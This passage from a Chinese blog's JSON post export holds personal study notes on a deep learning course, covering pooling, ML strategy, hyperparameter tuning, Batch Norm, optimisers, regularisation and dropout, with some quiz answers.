40的图像变成一个一维的，和前面三维图像变一维一致\n\n![image-20230712090822392](./week4-1/image-20230712090822392.png)\n\n一个卷积网络往往分为三层（但是只用卷积也可能有很好的效果，池化层和全连接层比卷积层好实现）：\n\n![image-20230712091042761](./week4-1/image-20230712091042761.png)\n\n## 池化层\n\n最大池化（使用频率高）：如果在过滤器中提取到某个特征，那么保留其最大值，最大池化的效率也挺高：\n\n![image-20230712091346938](./week4-1/image-20230712091346938.png)\n\n输入和输出维度一致\n\n![image-20230712091547489](./week4-1/image-20230712091547489.png)\n\n平均池化：取平均值\n\n池化没有参数\n\n## 卷积神经网络示例\n\n卷积神经网络常见状态：就如图像最下面所示，全连接和前面所讲的神经网络类似，一般是卷积层跟着池化层，由于池化层没有参数，所以池化层和卷积层很多时候称为一层\n\n![image-20230712092339751](./week4-1/image-20230712092339751.png)\n\n![image-20230712092630679](./week4-1/image-20230712092630679.png)\n\n## 参数共享和稀疏连接\n\n\n\n如果使用正常神经网络会出现参数过大的情况：\n\n![image-20230712093340375](./week4-1/image-20230712093340375.png)\n\n卷积网络的输出每一个像素点只和一部分像素有关，避免过度拟合，并且改变输入的一些像素点只有对应的像素点会被改变\n","tags":["python"],"categories":["深度学习"]},{"title":"week3_2","url":"/post/82b66cdf.html","content":"\n## 进行误差分析\n\n比如一个分类猫的分类器，把一些很像猫的狗也错判断了猫\n\n那要专门去处理吗：\n\n+ 如果发现错误判断中将狗认成猫的概率很低就不用去处理了\n+ 如果比较高就可以处理，可以在标签中新建一行用来表示是狗\n+ <!--more-->\n\n## 清楚标注错误的来源\n\n错误分析图像中添加一列用来表示标记错误：\n\n![image-20230711092245412](./week3-2/image-20230711092245412.png)\n\n开发集和测试集必须来自同一分布，而对训练集要求没那么严格\n\n## 快速搭建你的第一个系统并进行迭代\n\n快速建立一个学习算法，然后根据结果进行不断调整，进行错误分析\n\n## 在不同的划分上进行训练和测试\n\n处理训练集和测试集存在差异的情况\n\n比如训练集是从网上搜取到的高清图片，开发集和测试集来自手机的模糊图片，这样的话最好的方法就是在训练集中添加模糊图片，而不是让三者平均分布，开发集和测试集必须直接考虑最后的使用情景\n\n不匹配数据划分的偏差和方差\n\n## 不匹配数据划分的偏差和方差\n\n训练集和开发集准确率相差大时考虑：\n\n1.算法只见过训练集的数据，没见过开发集的数据\n\n2.开发集数据来自不同的分布\n\n一个是已经学习过类似的判断错误，一个是因为没学习过的判断错误\n\n一个是说开发集的特征在训练集里面根本没有,一个是说开发集和训练集在某些关键的方面不一样\n\n解决方法：再定义一组新的数据 训练开发集 用控制变量法 \t训练开发集和训练集来自同一分布\t\n\n还是在训练集进行训练，然后分别测试训练开发集和开发集的准确率，如果训练开发集和开发集准确率差不多就称作方差过大，训练集过度拟合\t如果训练开发集和训练集误差相近，就猜测是开发集和测试集数据不匹配的问题\n\n确定各集合错误率之差，确定是由于可避免方差还是方差还是数据不匹配\n\n![image-20230711101008076](./week3-2/image-20230711101008076.png)\n\n## 解决数据不匹配\n\n人工查看开发集和训练集之间的差异\n\n将开发集或者测试集中的部分数据加载到训练集中，可能导致过度拟合\n\n## 迁移学习\n\n如果想从任务A学习，并迁移一些知识到任务B，那么当任务A和任务B都有相同的输入x时，迁移学习是有意义的，当任务A的数据比任务B多得多时，迁移学习的意义更大，当A的数据量比B还要小的时候，用处就不大\n\n## 多任务学习\n\n和多分类不同的是，多任务学习可能有多个标志为1，比如一张图片既有猫又有狗，这样的话它的损失函数就需要一个变量一个变量的求\n\n## 什么是端到端的深度学习\n\n如果训练集足够大，神经网络足够大，这种方法很好，但有时候训练集不够大，需要将端到端拆分成子任务，比如人脸识别系统，最好的就是先识别人所在的位置，给出人所在的坐标，对图像进行放大，再对放大的图像做人脸识别效果会好很多\n\n## 是否要使用端到端的深度学习\n\n![image-20230711211351195](./week3-2/image-20230711211351195.png)\n","tags":["python"],"categories":["深度学习"]},{"title":"week3_1","url":"/post/1bbf3d65.html","content":"\n## 为什么是ML策略\n\n优化深度学习时考虑的策略\n\n![image-20230710203005397](./week3-1/image-20230710203005397.png)\n\n帮助我们选择更好的算法\n\n<!--more-->\n\n## 正交化\n\n机器学习可以选择的调整方法有很多，就比如超参数的调节就有很多\n\n正交化：调整最有效的参数，使各参数之间的调节更加独立化\n\n有四个问题，对应相应的解决方法，问题一：更大的数据集或者Adam优化算法\t问题二：正则化或者更大的训练集\t问题三：更大的验证集\t问题四：改变成本函数等\n\n![image-20230710204058825](./week3-1/image-20230710204058825.png)\n\n## 单一数字评估指标\n\n用一个数字评估告诉我更换新方法之后的性能是否提升\n\n一种方法是查看算法的准确率：\n\n+ 查全率(recall)：真正为真的值有多少被预测出来了\n+ 查准率(precision)：预测为真的值中真正为真的值所占比例\n+ 有一个问题就是查全率高的不一定查准率高，查准率高的可能查全率低\n\n由上面的评估指标推出了F1分数，即查全率和查准率的平均值 F1=2/(1/P+1/R)  (调和平均数)\n\n这个评估就是在交叉验证集上做的\n\n## 满足和优化指标\n\n要把所有考虑的指标集合成一个实数并不容易\n\n优化指标：尽量做到最好\n\n满足指标：达到某个范围\n\n## 训练 _ 开发 _ 测试集划分\n\n开发集和测试集最好都来自同一分布\n\n设置开发集和单一数字评估指标，朝着一个目的出发\n\n## 开发集合测试集的大小\n\n数据量越多，训练集的集合占比就可以越大，开发集和测试集占比越小，开发集和测试集往往不需要一直增大，足够大就可以了\n\n很多时候没有测试集，人们直接在开发集上进行迭代，但是人们往往叫他测试集\n\n## 什么时候该改变开发_测试集和指标\n\n## 理解人的表现\n\n将人的最好表现设置为估计贝叶斯错误率\t但是一般也和你这个系统的最终目的有关\n\n可避免偏差是min(贝叶斯错误率和测试集之间的差,测试集和开发集之间的差)\n\n![image-20230710214505203](./week3-1/image-20230710214505203.png)\n","tags":["python"],"categories":["深度学习"]},{"title":"week2_3","url":"/post/f473367e.html","content":"\n## 调试处理\n\n超参数：α β β1 β2 layers ε hidden-units learning-rate decay mini-batch-size\n\n红色是最需要调试的，其次是黄色，再其次是紫色\tβ是指用momentum是的参数\tβ1、β2是指用adam所有的参数\t\n\n<!--more-->\n\n![zz](./week2-3/image-20230709084235636.png)\n\n两个超参数选择\n\n方法一：传统方法，取取样点，比如下图可以尝试这二十五个点，然后选择哪个参数最好，当参数的数量相对较小时，实用\n\n![image-20230709084949711](./week2-3/image-20230709084949711.png)\n\n方法二：随机选择取样点，因为可能这两个超参数影响度不一样，可能有一个超参数不会起很大作用，那另一个如果用传统方法只有五个可选点，比较少\n\n![image-20230709085002493](./week2-3/image-20230709085002493.png)\n\n对于三层，再进行扩展\n\n如果发现某一个区域的效果都比较好，那就放大这个区域，然后再精确的取一些值\n\n![image-20230709085204659](./week2-3/image-20230709085204659.png)\n\n## 为超参数选择合适的范围\n\n随机取值并不是在有效值范围内的随机均匀取值，而是选择合适的步进值\n\n如果要选择α在0.0001-1,这样选择0.1-1之间的概率会比较高\n\n所以更好的方法是设置每一组随机选择的概率相同\n\n![image-20230709090604179](./week2-3/image-20230709090604179.png)\n\n![image-20230709091204679](./week2-3/image-20230709091204679.png)\n\n## 超参数训练的实践\n\nBabysitting one model:每隔一个阶段就观察成本函数，并根据成本函数的变化趋势调整参数，这种方法通常是在计算机计算能力不够的时候进行的(panda,熊猫)\n\nTraining many models in parallel:多个模型同时运行，选择效果最好的(cavier,鱼子酱)\n\n## 正则化网络的激活函数\n\nbatch归一化，这种方法可以使我的参数搜索问题变得简单，使神经网络对超参数的选择更加稳定，超参数的范围会庞大，工作效果也更好\n\n在逻辑回归归一化设置中 X-=μ X/=σ\n\n对于batch归一化，归一上一层的a[i]，以更快速的训练W[3]b[3]，实际上我们归一的是z[i]不是a[i]\n\n可以选择直接归一化，和逻辑回归归一化一样，这样z会有平均值0和方差1，但是通常我们希望z有平均值和方差，γ和β可以仿造w和b权重更新的方法进行更新 γ和β是为了设置z的平均值和方差\n\n![image-20230709102954012](./week2-3/image-20230709102954012.png)\n\n## 将Batch Norm拟合进神经网络\n\n![image-20230709110555224](./week2-3/image-20230709110555224.png)\n\nb[i]在这里作用不大，因为z进行batch归一化的时候，会先将均值设置为0，这样的话b[i]的用处就不大，可以去掉，注意β[i]和γ[i]的维度都是n[l] * 1\n\n![image-20230709111240690](./week2-3/image-20230709111240690.png)\n\n伪代码：\n\n```python\nfor t in range(1,numMiniBatches):\n    parameters=initParameters(layerdims)\n    AL,cache=forward(parameters,X{t})\n    cost=compute_cost(AL,Y{t})\n    grads=backforward(cost,cache,X)\n    parameters=update_parameters(parameters)\n```\n\n这里的parameters有参数 W β γ\tgrads对应\n\n![image-20230709111955428](./week2-3/image-20230709111955428.png)\n\n## Batch Norm为什么奏效\n\n## 测试时的Batch Norm\n\nμ和σ通常用指数加权平均来估算\n\n到最后测试的时候，就不再计算μ和σ\n\n![image-20230709134945572](./week2-3/image-20230709134945572.png)\n\n## Softmax回归\n\n不再是只识别两个分类，可以识别多个分类\n\n参数：C表示输入会被分入的类别总个数 最后一层的维数不再是1，而是4了(是4的原因是这儿有四个输出变量)\n\n![image-20230709135324845](./week2-3/image-20230709135324845.png)\n\n最后一层应用Softmax激活函数\n\n参数：临时变量 t=e^z[l]\n\n![image-20230709202801516](./week2-3/image-20230709202801516.png)\n\n## 训练一个Softmax分类器\n\n损失函数和成本函数的计算：\n\n![image-20230709203056569](./week2-3/image-20230709203056569.png)\n\n![image-20230709203239795](./week2-3/image-20230709203239795.png)\n\n## 深度学习框架\n\neg:\n\n![image-20230709203825234](./week2-3/image-20230709203825234.png)\n\n## TensorFlow\n\n一种深度学习框架 只需要我们写正向传播，会自动帮我们计算反向传播\n\n![image-20230709205405507](./week2-3/image-20230709205405507.png)\n\nplaceholder在这儿表示等会就会提供x的值，提供方式如下：![image-20230709204902762](./week2-3/image-20230709204902762.png)\n\nsession相同表示方法：\n\n![image-20230709205716809](./week2-3/image-20230709205716809.png)\n\n对于Tensorflow的代码实现而言，实现代码的结构如下：\n\n1. 创建Tensorflow变量（此时，尚未直接计算）\n2. 实现Tensorflow变量之间的操作定义\n3. 初始化Tensorflow变量\n4. 创建Session\n5. 运行Session，此时，之前编写操作都会在这一步运行。\n\n## 测试题\n\n1.If your Neural Network model seems to have high variance, what of the following would be promising things to try? (如果你的神经网络模型似乎有很高的方差，下列哪个尝试是可能解决问题的？)\n\n【★】Add regularization(添加正则化)\n\n【★】Get more training data (获取更多的训练数据)\n\n\n\n\n\n2.Which of these techniques are useful for reducing variance (reducing overfitting)? (Check all that apply.) (以下哪些技术可用于减少方差（减少过拟合）)\n\n【★】Dropout \n\n【★】L2 regularization (L2 正则化)\n\n【★】Data augmentation(数据增强)\n\n\n\n\n\n3.Which of these statements about mini-batch gradient descent do you agree with?(关于 minibatch 的说法哪个是正确的？)\n\n【 】You should implement mini-batch gradient descent without an explicit for-loop over different mini-batches, so that the algorithm processes all mini-batches at the same time (vectorization).(在不同的 mini-batch 下，不需要显式地进行循环，就可以实现 mini-batch 梯度下降，从而使算法同时处理所有的数据（向量化）) \n\n【 】 Training one epoch (one pass through the training set) using mini-batch gradient descent is faster than training one epoch using batch gradient descent.(使用 mini-batch 梯度下降训练的时间（一次训练完整个训练集）比使用梯度下降训练的时间要快。) \n\n【★】One iteration of mini-batch gradient descent (computing on a single mini-batch) is faster than one iteration of batch gradient descent.(mini-batch 梯度下降（在单个 mini-batch 上计算）的一次迭代快于梯度下降的迭代。) \n\n\n\n4.During hyperparameter search, whether you try to babysit one model (“Panda” strategy) or train a lot of models in parallel (“Caviar”) is largely determined by: (在超参数搜索过程中，你尝试只照顾一个模型（使用熊猫策略）还是一起训练大量的模型（鱼子酱策略）在很大程度上取决于：)\n\n【 】Whether you use batch or mini-batch optimization (是否使用批量（batch）或小批量优化（mini-batch optimization）)\n\n【 】The presence of local minima (and saddle points) in your neural network (神经网络中局部最小值（鞍点）的存在性)\n\n【★】The amount of computational power you can access (在你能力范围内，你能够拥有多大的计算能力)\n\n【 】 The number of hyperparameters you have to tune(需要调整的超参数的数量)\n\n\n\n5.Which of the following statements about γ and β in Batch Norm are true? Only correct options listed(Batch Norm 中关于 γ 和 β 的以下哪些陈述是正确的？)\n\n【★】They can be learned using Adam, Gradient descent with momentum, or RMSprop, not just with gradient descent. (它们可以在 Adam、具有动量的梯度下降或 RMSprop 使中用，而不仅仅是用梯度下降来学习。)\n\n【★】They set the mean and variance of the linear variable 𝑧 [𝑙] of a given layer.( 它们设定给定层的线性变量𝑧 [𝑙] 的均值和方差)\n","tags":["python"],"categories":["深度学习"]},{"title":"week2_2","url":"/post/837406e8.html","content":"\n## Mini-batch梯度下降法\n\n优化算法可以帮助我们快速训练模型\n\n虽然向量化可以帮助我们提高运算速率，但是如果m很大，效率还是很低，因为我们每更新一次参数就需要重新进行正向传播，再更新参数，不断重复\n\n现在选择算法使进行正向传播前先优化参数\n\n可以把训练集分割成小一点的训练集，这些子集叫做mini-batch,如图所示，假设X有5000000个样本  将每1000个分成一个集合->x{i}\n\n<!--more-->\n\n同时训练这些小的训练集\n\n![image-20230708162045308](./week2-2/image-20230708162045308.png)\n\n伪代码(如果使用batch,要计算5000000个样本才迭代一次，但是如果使用mini-batch，每1000个样本就可以迭代一次参数)：\n\n```python\nfor i in range(1,5000):\n    AL,cache=forward(X{i},Y{i},parameters)\n    cost=compute_cost(AL,Y{i})\n    grads=back_forward(parameters,cache)\n    parameters=update_parameters(parameters,grads)\n```\n\n## 理解mini-batch梯度下降法\n\n成本函数图像可能不再严格单调递减，但是总体趋势一定是递减的\n\n![image-20230708163120090](./week2-2/image-20230708163120090.png)\n\n超参数：mini-batch的大小 如果mini-batch=m即代表就是batch,并未拆分\tx{1},y{1}=x,y 每次迭代需要处理大量样本，耗时长\n\nmini-batch=1:就有了新的算法，叫做随机梯度下降法，每个样本都互相独立，该种方法不可能有极小值，因为每个样本之间多少会有一定的差距，适合某一个样本的参数不一定就适合另一个样本，需要降低学习率\n\n蓝色是m的迭代方向，紫色是1的迭代方向，绿色是采用mini-batch方法的迭代方向\n\n![image-20230708163703647](./week2-2/image-20230708163703647.png)\n\n## 指数加权平均\n\neg:\n\n![image-20230708164540431](./week2-2/image-20230708164540431.png)\n\nβ越大，曲线越平缓：\n\n![image-20230708164854520](./week2-2/image-20230708164854520.png)\n\n## 理解指数加权平均\n\n## 指数加权平均的指数修正\n\n实际上我们得到的图形是紫线，因为设置初始值为0，v1=0.02θ1，很小，为了修正这种偏差，令除了Vi=0.98V(i-1)+0.02θi之外，再除以1-β^t，随着t越来越大，1-β^t越来越接近于1，紫线和绿线越来越接近\n\n![image-20230708190504966](./week2-2/image-20230708190504966.png)\n\n## 动量梯度下降法\n\nMomentum梯度下降法：计算梯度的指数加权平均数，并利用该梯度更新权重\n\n成本函数理想要求：学习率不宜过高，不然波幅就会很大，同时也希望学习时间够快\n\n得到dw的移动平均数，这样可以减缓梯度下降的幅度，因为如下图，可能发现成本函数接近极小值的图象是纵轴上的摆动平均值接近于0，最终纵轴摆动变小了，学习速度变快\n\n![image-20230708192134734](./week2-2/image-20230708192134734.png)\n\n现在有超参数α和β，β控制着指数加权平均数，最常用的值是0.9，相当于平均了前十次的导数\n\n两个初始值都是0(紫色部分也是一种，但是不怎么用)\n\n![image-20230708192425356](C:\\Users\\86157\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230708192425356.png)\n\n## RMSprop\n\nroot mean square prop\n\n该算法也可以加快梯度下降\n\n这里b表示纵轴，w表示横轴，现在希望b变化幅度不要太大，加快w的变化\n\ndb会比较大，从而导致Sdb也比较大，dw会比较小，从而导致Sdw也比较小，从而使b变化幅度不会太大，w变化幅度也不会太小，从蓝色图像变成绿色图像，同时可以用更大的学习率加快学习，一般为了防止根号下的内容过于小，会加上一个很小的值\n\n![image-20230708193531517](./week2-2/image-20230708193531517.png)\n\n## Adam优化算法\n\nadaptive moment estimation\n\n将RMSprop和动量梯度下降法结合起来\n\n![image-20230708194139616](./week2-2/image-20230708194139616.png)\n\n参数设置，学习率需要不断调试选出最合适的\n\n![image-20230708194741374](./week2-2/image-20230708194741374-168976898551518.png)\n\n## 学习率衰减\n\n比如使用mini-batch时，成本函数在迭代过程中会有波幅，但都是下降朝向最小值，会不断精确的收敛，但是不会真正的收敛，因为用的α是固定值\n\n所以α应该在前期是比较大的，然后随着不断学习，要做到精确收敛，α要不断变小\n\ndecay-rate是衰减率，epoch-num是次数\n\n![image-20230708201502202](./week2-2/image-20230708201502202.png)\n\nα的其他衰减函数\n\n## 局部最优的问题\n","tags":["python"],"categories":["深度学习"]},{"title":"week2_1","url":"/post/1a7d5752.html","content":"\n## 训练 _ 开发 _ 测试集\n\n超级参数的选择通过最开始选择然后不断迭代选择最优\n\n训练数据分为三部分：训练集，验证集(dev_set)，测试集\n\n对于小型数据，70train 30test\tor\t60train 20dev_set 20test\n\n大数据:验证集和测试集的占比减少验证集是为了检验那种算法更有效，所以验证集要足够大，但是比如我们有100万条数据，如果20dev_test就是20万条数据，太多了，可能取一万条数据就能进行评估了，然后找出最好的算法，测试集的主要目的是正确评估分类器的性能，所以比如拥有100万条数据，只需要10000条测试集就够了\n\n<!--more-->\n\n比如一个用户通过上传图片验证该图片是不是猫，网上猫的图片就是训练集，用户上传的图片是验证集和测试集，但是网上的照片可能比用户上传的更高清，更好分析，要保证验证集和测试集来自同一分布，因为要用验证机来评估不同的模型/算法\t测试集是对最后的神经网络做出无偏评估，不是必需的\n\n如果只有验证机没有测试集：在训练集上训练，尝试不同的模型框架，在验证集上评估这些模型，并选择适合的模型\n\n## 偏差_方差\n\n过度拟合：“过于紧密或精确地对应于特定数据集的分析结果，因此可能无法拟合其他数据或可靠地预测未来的观察结果”\n\n避免过度拟合和欠拟合->适度拟合\n\n训练集误差\t验证集误差，如果训练集误差很小，验证集较大，则称存在高方差；如果误差都比较大，称为欠拟合，高偏差；如果训练集误差比较大，训练集更大，则称存在高偏差和高方差\n\n最优误差也称为贝叶斯误差，训练集误差的大小是通过和最优误差进行比较后判断的，比如若用户上传的图片本身就很模糊，即使人眼也很难一眼识别，这种的基本误差就大，\n\n欠拟合会出现高偏差\t局部过度拟合出现高方差和高偏差，因为他几乎是一条线性分类器并未拟合数据\n\n## 机器学习基础\n\n高偏差：选择更优算法或神经网络\n\n高方差：扩充数据集、正则化、或者其他模型结构来解决高方差\n\n最终目的：低偏差，低方差\n\n正则化：训练一个更大的网络几乎没有任何负面影响，而训练一个大型神经网络的主要代价也只是计算时间\n\n## 正则化\n\n正则化：针对过度拟合\n\nL2正则化(最常见)：正则化其实是限制了W数据本身，使得最后分类的曲线不要太奇形怪状，就能抑制过拟合\n\n如果λ太大，也可能会“过度平滑”，从而导致模型高偏差\n\n![image-20230707110026468](./week2-1/image-20230707110026468.png)\n\nL1正则化：W会比较稀疏，也就是说W向量中有很多0\n\n![image-20230707110251006](./week2-1/image-20230707110251006.png)\n\nL1正则化W更稀疏原因：\n\n+ L1和L2正则常被用来解决过拟合问题。而L1正则也常被用来进行特征选择，主要原因在于L1正则化会使得较多的参数为0，从而产生稀疏解，将0对应的特征遗弃，进而用来选择特征。\n\n  但为什么L1正则会产生稀疏解呢？这里利用公式进行解释。\n\n  假设只有一个参数为 w，损失函数为L(w)，分别加上L1正则项和L2正则项后有：\n\n  假设L(w)在0处的倒数为 d0 ，即\n\n  ![img](./week2-1/100045082-79912-2.png)\n\n  则可以推导使用L1正则和L2正则时的导数\n\n  引入L2正则项，在 0 处的导数\n\n  ![img](./week2-1/100045082-79913-3.png)\n\n  引入L1正则项，在0处的导数\n\n  ![img](./week2-1/100045082-79914-4.png)\n\n  可见，引入L2正则时，代价函数在 0 处的导数仍是 d0 ，无变化。而引入L1正则后，代价函数在0处的导数有一个突变。从 d0 + λ 到 d0 − λ ，若 d0 + λ 和 d0 − λ 异号，则在 0 处会是一个极小值点。因此，优化时，很可能优化到该极小值点上，即 w = 0 处。\n\n  这里只解释了有一个参数的情况，如果有更多的参数，也是类似的。因此，用L1正则更容易产生稀疏解。\n\n这里的入是正则化参数\n\n对于多层神经网络：相当于在原来的W=W-α * dW的基础上再减    λ/m * W,\n\n![image-20230707113908610](./week2-1/image-20230707113908610.png)\n\n## 为什么正则化有利于预防过拟合呢\n\n如果入足够大，W就越接近于0，当正则化参数足够大，W会变小，Z会变小\n\n如果不用正则化，则成本函数根据次数迭代可能就不是单调递减的\n\n## Dropout正则化\n\ndropout会遍历网络的每一层，并设置消除神经网络中结点的概率\n\n比如每一层的每个节点得以保留和消除的概率都是0.5，然后删除一些节点并删除相应的连线，对于每一个训练样本，都将采取一个精简后的神经网络来训练它\n\n![image-20230707133559373](./week2-1/image-20230707133559373.png)\n\n最常用的Dropout正则化方法：inverted dropout(反向随机失活)（以三层神经网络为例）：\n\n+ 首先定义变量d，d3表示一个三层的dropout变量 d3=np.random.randn(a3.shape[0],a3.shape[1])<**keep-prob**(keepprob表示一个具体的数字，eg:0.8,表示保留某个隐藏单元的概率，它的作用是生成随机矩阵)\n+ d3中的对应值为1的概率是0.8，为0的概率是0.2 keep_prob被广播了，和前面的随机矩阵的每个元素比较，比它小的是0，比它的大的是1，所以d3就是个一堆0和1的矩阵 就有a3=np.multiply(a3,d3),作用是过滤掉a3中d3对应位置为0的元素，然后向外扩展a3,**a3/=keepprob**(解释：假设第三隐层有50个单元，a3就是一个50 * m的矩阵，假设keep-prob=0.8,则最后被删除或者归零的元素有10个，z[4]=W[4] * a[3]+b[4],为了使a[3]的改变最小程度的影响到z[4]，所以将a3/=keep-prob,使a[3]的期望不变)\n+ 同时不难发现对于不同的样本，归零的神经单元也不同，如果使用相同训练集多次传递数据，每次训练的梯度也不同\n\n在测试阶段不使用Dropout,因为在测试阶段进行测试时我们不希望输出结果是随机的，因为在训练的时候已经考虑了期望的问题，即使测试集不用dropout也没有问题\n\n## dropout\n\n仿佛采用一个更小的神经网络和使用dropout正则化效果是一样的\n\n对于使用dropout正则化的神经网络，如果上一层使用了dropout正则化，则下一层的单元不能依靠任何特征，因为任何特征都有可能被删除，我们不愿意把所有赌注放在一个节点上，不想下一层的输出依靠于上一层的每个特征，因此该单元将通过这种方式积极的传播开，通过传播所有权重，dropout将产生收缩权重的平方范数的效果，L2对不同权重的衰减是不同的取决于倍增的激活函数的大小，**dropout和L2正则化的功能是类似的**\n\n+ dropout和L2正则化的功能是类似的，因为它们都可以防止神经网络过拟合，提高泛化能力。过拟合的原因是模型太复杂，参数太多，训练数据太少或有噪声，导致模型对训练数据过度拟合，而不能适应新的数据\n+ dropout的方法是在训练过程中随机地“删除”一部分隐藏层节点，使得每次训练的网络结构不同，相当于训练了很多个子网络，最后再将它们组合起来。这样可以减少隐藏层节点之间的相互依赖，增加网络的多样性和鲁棒性。\n+ L2正则化的方法是在代价函数中加入一个正则项，对所有参数w的平方求和，乘以一个正则化系数λ。这样可以使得参数w的值更小，从而降低模型的复杂度和方差。L2正则化也可以理解为对模型参数进行了一个高斯先验假设，使得参数更加平滑和稳定。dropout和L2正则化都有利于减少模型的自由度，防止模型过度拟合训练数据，提高模型在测试数据上的表现。它们也可以结合使用，根据实验结果选择合适的参数。\n\n首先选择keep-prob，不同层的keep-prob可以不一样，对于一些担心过度拟合的层，keep-prob可以低一点\n\n实施dropout在计算机视觉领域很成功，因为计算机视觉的输入量非常大\n\ndropout的一大缺点是代价函数J不再被明确定义，因为每次迭代都会随机移除一些节点 正则化对策出现的原因就是我们无法准确给出某一问题模型的具体网络尺寸，只能通过尝试简化模型，通常先通过将所有的dropout设置为1，再绘制J的图形，再恢复dropout，这时候就没办法绘制J的图形\n\n## 其他正则化方法\n\n1. 直接增加训练集的数目代价太大了，可以选择通过将训练集的图片进行翻转，标签不变，也可以随机裁剪图片\n\n2. early stopping\n\n   不仅绘制训练集的J函数图像，也绘制验证集的J的图像，验证集的代价函数通常先下降，然后在某个点回升，就相当于，在验证集的代价函数达到极小值的时候，停止迭代，因为在迭代过程中W会不断增大，通过这种方式可以避免W的过度增大\n\n   可以看成之前的曲线，W刚开始时很小，对应的J很大，到了中间某个值的时候最优，J最小，W再大，J就会变大，前面的课有一个凸函数曲线\n\n   缺点：提前结束可以防止过度拟合，也就是高方差的问题，但是有可能会出现偏差，因为J并不小，对J的优化可能不够 \n\n## 归一化输入\n\n归一化输入可以加快训练方法\n\n归一化输入有两个步骤：\n\n第一步是零均值化：\n\n![image-20230707214829466](./week2-1/image-20230707214829466.png)\n\n第二步是归一化方差：\n\n比如上图中X1的方差比X2大：\n\n![image-20230707215217361](./week2-1/image-20230707215217361.png)\n\n如果选好了参数进行训练集归一化，那么测试集要用相同的参数\n\n就不再计算如果使用非归一化，代价函数不直观：\n\n![image-20230707231953543](./week2-1/100045082-79911-1.png)\n\n标准化：\n\n![image-20230707232321944](./week2-1/image-20230707232321944.png)\n\n如果不归一化学习率很小，因为W可变范围不大\n\n因此如果输入特征的范围值差别太大，比如有些是0-1，有些是1-1000，就需要归一化，如果相近就不需要归一化\n\n## 梯度消失和梯度爆炸\n\n导数和梯度有可能非常小或者非常大，这加大了训练的难度\n\nW>1时，成本函数指数增长\tW<0时成本函数指数降低\n\n![image-20230707233203258](./week2-1/image-20230707233203258.png)\n\n抛出两个梯度下降中的两个存在性问题  在多层隐藏层的情况下 W>1 可能会造成梯度爆炸，W<1 可能会造成梯度消失的情况\n\n## 神经网络的权重初始化\n\n假设一层神经网络 a=g(z) z=W * X + b=w1 * x1 + w2 * x2 + w3 * x3 + ……，如果n越大，也就是X的特征值越多，就希望wi的值小，不然得出的z就会很大，最合理的方式是wi的方差为1/n\n\n我们从一个**正态分布**（均值为零，单位标准差）中**抽取随机值**，然后乘以一个小数字，比如**0.01**。结果将是一个标准差接近**0.01**的权重集。如果是ReLU函数，令方差是2/n,因为ReLu在z<0段导数和值都为0,注意，这里的np.sqrt是开方的意思\t[W要乘以1/n的原因]([深度前馈网络与Xavier初始化原理 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/27919794))\n\n![image-20230708134430767](./week2-1/image-20230708134430767.png)\n\n## 梯度的数值逼近\n\n使用双边误差的方法更接近导数\n\n![image-20230708134824440](./week2-1/image-20230708134824440.png)\n\n使用双边误差来判断导数是否正确实现了函数f的偏导，可以用这个方法来检验反向传播函数是否正确进行\n\n## 梯度检验\n\n梯度检验(Grad check)可以检验反向传播的过程是否有误\n\n第一步：将所有参数转换成一个巨大的向量数据\n\n![image-20230708140048097](./week2-1/image-20230708140048097.png)\n\n就是之前求梯度是通过推出的公式，这里求梯度是通过邻近两个割点求近似值，如果这两个梯度值差不多的话，那么就说明我们之前做的是对的\n\n检查你在反向传播阶段做求偏导运算时有没有算错\n\n差值(这里的2是指ord为2的范数，即除以![\\sqrt{x_{1}^{2} + x_{2}^{2} + ... + x_{n}^{2}}](./week2-1/sqrt%7Bx_%7B1%7D%5E%7B2%7D%20&plus;%20x_%7B2%7D%5E%7B2%7D%20&plus;%20...%20&plus;%20x_%7Bn%7D%5E%7B2%7D%7D))：\n\n![image-20230708154400361](./week2-1/image-20230708154400361.png)\n\n## 关于梯度检验实现的注记\n\n首先不要在训练中使用梯度检验，他只用于调试\n\n梯度检验和dropout不能同时使用，除非将keep-prob设置为1\n\n","tags":["python"],"categories":["深度学习"]},{"title":"深度学习week1_4","url":"/post/bb71978.html","content":"\n## 深层神经网络\n\n更多的层数，更多的隐藏节点\n\n新的参数：L->层数\tn[i]第i层的节点数，输入层是第0层 `X=a[0]`\ta[i]表示激活函数->`a[i]=g(z[i]``)`\t`a[L]=y_hat`\n\n每一层完成的工作：`input a[i-1]\toutput a[i]     cache z[i]`\n\n`z[i]=W[i] * a[i-1] + b[i]`\n\n`a[i]=g(z[i])`\n\n<!--more-->\n\n反向传播：\n\n`da[L]=-y/a+(1-y)/(1-a)`\n\n`dz[L]=da[L] * g`(z[L])`\n\n`dW[L]=dz[L] * a[L-1].T`   \n\n`db[L]=np.sum(dz[L],axis=1,keepdim=True)`\n\n`da[L-1]=W[L].T * dz[L]`\n\n`dz[L-1]=da[L-1] * g`(z[L-1])`\n\n## 深层网络中的前向传播\n\n正向传播时：\n\n`Z[1]=W[1] * A[0] + b[1]`\n\n`A[1]=g(Z[1])`\n\n`Z[2]=W[1] * A[1] +b[1]`\n\n`A[2]=g(Z[2])`\n\n……\n\n上述使用for循环\n\n## 核对矩阵的维数\n\nZ[i]的横向量：第i层的节点数，纵向量：样本数\t(n[i],m)\n\nW[i]的横向量：第i层的节点数，纵向量：A[i-1]的横向量，即第i-1层的节点数\t(n[i],n[i-1])\n\nb[i]：(n[i],1)\n\ndW[i]和W[i]的维度一样\n\ndb[i]和b[i]的维度一样\n\n## 为什么使用深层表示\n\n深度即更多的隐藏层，为什么需要这么多的隐藏层呢(输入层和输出层不算隐藏层)\n\n深度神经网络结构：第0层即输入层，比如输入的一张图片，输入层就相当于特征提取器，假设建立20个隐藏单元的深度神经网络，隐藏单元就是图里的一些小单元，然后将照片里组成边缘的像素们放在一起看，然后它可以把探测到的边缘组合成面部的不同部分\n\n## 搭建深层神经网络块\n\n上面是正向传播，下面是反向传播\n\n![image-20230706093807182](./week1-4/image-20230706093807182.png)\n\n## 参数VS超参数\n\n参数：比如W,b\n\n超参数：比如α(学习率)，梯度下降法循环的数量，隐层数L，隐藏单元数(n[0],n[1],n[2]……)，激活函数的选择\t——>这些数字实际上是由我们自己设置的，并且会影响参数W和b的值，所以称为超参数\n\n如果无法确定选择什么α,可以先用不同的α来测试cost的大小，找到最适合的α\n\n## 测试\n\n【★】The deeper layers of a neural network are typically computing more complex features of \n\nthe input than the earlier layers. 